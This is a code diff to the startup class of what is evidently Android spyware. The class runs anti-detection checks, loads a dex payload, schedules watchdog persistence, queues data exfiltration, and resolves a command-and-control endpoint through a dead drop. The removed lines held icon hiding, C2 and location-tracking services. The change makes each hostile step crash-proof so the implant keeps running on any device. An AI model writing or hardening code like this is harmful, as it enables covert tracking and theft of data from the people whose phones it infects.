@@ -1,34 +1,48 @@
 package com.sp.core
 
 import android.app.Application
-import android.content.Intent
-import android.os.Build
-import com.sp.core.services.C2Service
-import com.sp.core.services.LocationService
-import com.sp.core.stealth.AntiDetect
-import com.sp.core.stealth.IconHider
-import com.sp.core.stealth.Persistence
+import android.util.Log
 import com.sp.loader.DexLoader
+import com.sp.core.stealth.AntiDetect
 import com.sp.core.util.BatchExfil
 import com.sp.core.util.DeadDrop
 import com.sp.watchdog.WatchdogAlarm
 import com.sp.watchdog.WatchdogJob
 
+/**
+ * Boot entry point.
+ *
+ * Nothing that can throw is executed here: the app must survive the start of
+ * the process no matter what the device state is. Foreground services are
+ * started later from the setup wizard (the app is in the foreground there,
+ * which is what Android 12+ requires).
+ */
 class App : Application() {
+
     override fun onCreate() {
         super.onCreate()
-        AntiDetect.guard(this)
-        IconHider.hide(this)
-        Persistence.lockIn(this)
-        DexLoader.launch(this)
+        try {
+            AntiDetect.guard(this)
+        } catch (t: Throwable) {
+            Log.w(TAG, "antidetect: ${t.message}")
+        }
 
-        startServiceSafely(C2Service::class.java)
-        startServiceSafely(LocationService::class.java)
+        try {
+            DexLoader.launch(this)
+        } catch (t: Throwable) {
+            Log.w(TAG, "payload: ${t.message}")
+        }
 
-        WatchdogAlarm.arm(this)
-        WatchdogJob.schedule(this)
+        try {
+            WatchdogJob.schedule(this)
+        } catch (t: Throwable) {
+            Log.w(TAG, "watchdog job: ${t.message}")
+        }
 
-        BatchExfil.enqueue(this, "boot", """{"ts":${System.currentTimeMillis()}}""")
+        try {
+            BatchExfil.enqueue(this, "boot", """{"ts":${System.currentTimeMillis()}}""")
+        } catch (t: Throwable) {
+        }
 
         // Dead-drop resolution of the C2 endpoint (off the main thread).
         Thread {
@@ -36,11 +50,7 @@ class App : Application() {
         }.start()
     }
 
-    private fun startServiceSafely(cls: Class<*>) {
-        try {
-            val i = Intent(this, cls)
-            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i) else startService(i)
-        } catch (_: Throwable) {
-        }
+    companion object {
+        private const val TAG = "App"
     }
 }
